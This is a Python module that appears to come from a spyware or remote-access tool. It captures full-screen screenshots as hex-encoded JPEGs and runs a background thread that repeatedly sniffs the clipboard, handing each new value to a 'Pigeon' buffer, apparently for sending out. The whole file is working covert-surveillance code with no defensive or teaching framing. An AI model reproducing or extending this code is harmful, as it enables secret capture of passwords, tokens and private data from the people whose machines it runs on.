from config import RUNNING
from io import BytesIO
from PIL import ImageGrab
from .pigeon import Pigeon
from pyperclip import paste  # type: ignore
from time import sleep
from threading import Thread


def grabSS(delay: int = 0) -> str:
    sleep(delay)
    img = ImageGrab.grab()
    imgBytes = BytesIO()
    img.save(imgBytes, format="JPEG")
    return imgBytes.getvalue().hex()


def clipboardSniffer(delay: int = 10) -> None:
    Thread(target=__clipboardService, args=(delay,)).start()


def __clipboardService(delay: int) -> None:
    prev = ""
    while RUNNING.is_set():
        sleep(delay)
        curr = paste()
        if curr != "" and curr != prev:
            Pigeon.pushToBuffer("clipboard", "{} | ".format(curr))
            prev = curr
